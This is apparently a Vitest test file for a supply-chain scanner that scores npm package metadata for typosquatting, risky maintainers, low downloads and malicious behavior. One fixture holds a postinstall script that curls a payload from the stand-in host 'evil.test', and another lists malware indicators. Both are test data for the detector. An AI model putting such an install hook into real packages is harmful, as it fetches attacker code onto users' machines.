import { describe, it, expect } from 'vitest';
import { RuleEngine } from '../engine.js';
import { PostInstallRule } from '../rules/postinstall.js';
import { TyposquatRule } from '../rules/typosquat.js';
import { MissingRepoRule } from '../rules/missing-repo.js';
import { MaintainerRule } from '../rules/maintainer.js';
import { DownloadTrendsRule } from '../rules/downloads.js';
import { BehavioralRule } from '../rules/behavioral.js';
import { LifecycleScriptBehaviorRule } from '../rules/lifecycle-behavior.js';
import { FreshReleaseRule } from '../rules/fresh-release.js';

describe('RuleEngine', () => {
  it('should calculate scores correctly', () => {
    const engine = new RuleEngine();
    engine.registerRule(new PostInstallRule());
    
    const metadataWithScript = {
      name: 'test',
      version: '1.0.0',
      scripts: { postinstall: 'echo win' }
    };

    const report = engine.analyze(metadataWithScript as any);
    expect(report.score).toBe(20);
    expect(report.severity).toBe('high');
  });

  it('should detect typosquatting', () => {
    const engine = new RuleEngine();
    engine.registerRule(new TyposquatRule());

    const metadata = {
      name: 'reactt',
      version: '1.0.0',
      nameRisk: {
        target: 'react',
        reason: 'Dynamic similarity check matched react with much stronger ecosystem signals',
        confidence: 'high'
      }
    };

    const report = engine.analyze(metadata as any);
    expect(report.findings.length).toBe(1);
    expect(report.findings[0].id).toBe('typosquat-detection');
    expect(report.score).toBe(35);
  });

  it('should detect missing repository', () => {
    const engine = new RuleEngine();
    engine.registerRule(new MissingRepoRule());

    const metadata = {
      name: 'test',
      version: '1.0.0'
      // missing repository
    };

    const report = engine.analyze(metadata as any);
    expect(report.findings.some(f => f.id === 'missing-repository')).toBe(true);
    expect(report.score).toBe(15);
  });

  it('should detect single maintainer', () => {
    const engine = new RuleEngine();
    engine.registerRule(new MaintainerRule());

    const metadata = {
      name: 'test',
      version: '1.0.0',
      maintainers: [{ name: 'alice' }]
    };

    const report = engine.analyze(metadata as any);
    expect(report.findings.some(f => f.id === 'maintainer-reputation')).toBe(true);
    expect(report.score).toBe(10);
  });

  it('should detect low downloads', () => {
    const engine = new RuleEngine();
    engine.registerRule(new DownloadTrendsRule());

    const metadata = {
      name: 'test',
      version: '1.0.0',
      created: new Date(Date.now() - 100 * 24 * 3600 * 1000).toISOString(), // 100 days ago
      weeklyDownloads: 100
    };

    const report = engine.analyze(metadata as any);
    expect(report.findings.some(f => f.id === 'low-downloads')).toBe(true);
    expect(report.score).toBe(15);
  });

  it('should detect suspicious behavior', () => {
    const engine = new RuleEngine();
    engine.registerRule(new BehavioralRule());

    const metadata = {
      name: 'test',
      version: '1.0.0',
      inspection: {
          hasObfuscation: true,
          suspiciousApis: ['child_process'],
          envAccess: ['process.env access'],
          tlsBypass: true,
          hiddenExecution: true,
          detachedExecution: true,
          remoteIpAccess: true,
          homeDirectoryWrites: true,
          selfDelete: true,
      }
    };

    const report = engine.analyze(metadata as any);
    expect(report.findings.some(f => f.id === 'behavioral-analysis')).toBe(true);
    expect(report.score).toBe(100);
    expect(report.severity).toBe('critical');
  });

  it('should detect suspicious lifecycle script contents', () => {
    const engine = new RuleEngine();
    engine.registerRule(new LifecycleScriptBehaviorRule());

    const metadata = {
      name: 'test',
      version: '1.0.0',
      scripts: {
        postinstall: 'node setup.cjs && curl https://evil.test/payload'
      }
    };

    const report = engine.analyze(metadata as any);
    expect(report.findings.some(f => f.id === 'lifecycle-script-behavior')).toBe(true);
    expect(report.severity).toBe('critical');
  });

  it('should detect very recent releases', () => {
    const engine = new RuleEngine();
    engine.registerRule(new FreshReleaseRule());

    const metadata = {
      name: 'test',
      version: '1.0.0',
      published: new Date(Date.now() - 24 * 3600 * 1000).toISOString(),
    };

    const report = engine.analyze(metadata as any);
    expect(report.findings.some(f => f.id === 'fresh-release')).toBe(true);
    expect(report.severity).toBe('high');
  });
});
